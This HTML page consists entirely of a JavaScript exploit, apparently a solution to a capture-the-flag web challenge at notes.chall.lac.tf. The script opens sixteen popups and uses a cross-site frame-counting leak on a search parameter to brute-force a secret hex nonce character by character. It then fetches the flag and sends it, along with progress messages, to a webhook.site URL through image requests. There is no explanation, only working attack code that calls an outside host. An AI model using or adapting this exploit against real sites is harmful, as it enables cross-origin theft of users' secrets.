<!DOCTYPE html>
<html>
<body>
<script>
var CHALL = 'https://notes.chall.lac.tf';
var WH = 'https://webhook.site/c9c4e814-b8d9-47ab-ace4-1afa4d09088f';
var HEX = '0123456789abcdef';

function ping(m) { new Image().src = WH + '?' + encodeURIComponent(m); }
function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }

function mkurl(prefix) {
  return CHALL + '/?name=x&referrerPolicy=adf&search=' + encodeURIComponent(prefix);
}

async function run() {
  try {
    ping('v2_start');
    var t0 = Date.now();

    // Open 16 popups
    var P = [];
    for (var i = 0; i < 16; i++) {
      try { P.push(window.open('about:blank')); } catch(e) { P.push(null); }
      await sleep(20);
    }
    var cnt = 0;
    for (var i = 0; i < 16; i++) {
      try { if (P[i] && !P[i].closed) cnt++; } catch(e) {}
    }
    ping('pop=' + cnt);

    var nonce = '';

    for (var pos = 0; pos < 8; pos++) {
      try {
        if (Date.now() - t0 > 50000) { ping('TO_' + pos); break; }

        var found = null;

        // Navigate all popups
        for (var c = 0; c < cnt; c++) {
          try { if (P[c] && !P[c].closed) P[c].location = mkurl(nonce + HEX[c]); } catch(e) {}
        }
        await sleep(1500);

        var cyc = 0;
        for (var cycle = 0; cycle < 20 && !found; cycle++) {
          if (Date.now() - t0 > 55000) break;
          cyc = cycle;

          // Check all popups
          for (var c = 0; c < cnt; c++) {
            try {
              if (!P[c] || P[c].closed) continue;
              var len = P[c].length;
              if (len < 6) continue;
              var ref = P[c]['adf'];
              if (!ref) continue;
              if (P[c][0] !== ref) {
                found = HEX[c];
                break;
              }
            } catch(e) {}
          }
          if (found) break;

          // Reload all for fresh shuffle
          for (var c = 0; c < cnt; c++) {
            try { if (P[c] && !P[c].closed) P[c].location = mkurl(nonce + HEX[c]); } catch(e) {}
          }
          await sleep(650);
        }

        if (found) {
          nonce += found;
          ping('p' + pos + '=' + found + '_c' + cyc);
        } else {
          ping('p' + pos + '=X_c' + cyc);
          break;
        }
      } catch(e) {
        ping('err' + pos + '=' + (e.message || '').substring(0, 25));
        break;
      }
    }

    ping('n=' + nonce);

    if (nonce.length === 8) {
      try {
        var r = await fetch(CHALL + '/guess?nonce=' + nonce);
        var f = await r.text();
        ping('FLAG=' + encodeURIComponent(f));
      } catch(e) { ping('gerr'); }
    }

    for (var i = 0; i < 16; i++) { try { if (P[i]) P[i].close(); } catch(e) {} }
    ping('done');
  } catch(e) {
    ping('FATAL=' + (e.message || '').substring(0, 30));
  }
}
run();
</script>
</body>
</html>
